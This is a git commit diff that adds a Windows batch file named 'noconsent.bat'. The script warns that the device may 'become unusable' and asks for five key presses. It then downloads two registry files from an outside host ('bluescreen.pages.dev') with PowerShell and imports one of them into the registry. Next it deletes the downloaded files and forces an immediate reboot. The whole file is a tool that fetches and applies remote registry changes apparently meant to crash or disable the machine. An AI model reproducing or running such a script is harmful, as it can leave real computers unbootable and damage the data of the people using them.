a2d2ce87b117230254064d279447afbe1c177fa5
harryaldwithjarryald <148587892+harryaldwithjarryald@users.noreply.github.com>
2024-04-11 16:18:58 -0400

    Add files via upload

---
+++ noconsent.bat
@@ -0,0 +1,16 @@
+%echo off
+echo Press any key 5 times to confirm you want this device to possibly become unusable.
+pause
+pause
+pause
+pause
+pause
+powershell /c wget https://bluescreen.pages.dev/fix.REG -OutFile fix.REG
+powershell /c wget https://bluescreen.pages.dev/temp.REG -OutFile temp.REG
+echo NOTE:  If you want to backout now, close this cmd window, press "No" on the regedit window asking to import the file then run fix.reg in the folder you ran this from.
+echo Then, delete the files "fix.REG", "temp.REG", and "online_temp.bat" from the folder you ran this from.
+temp.REG
+del temp.REG
+del fix.REG
+shutdown -r -t 1
+del online_temp.bat
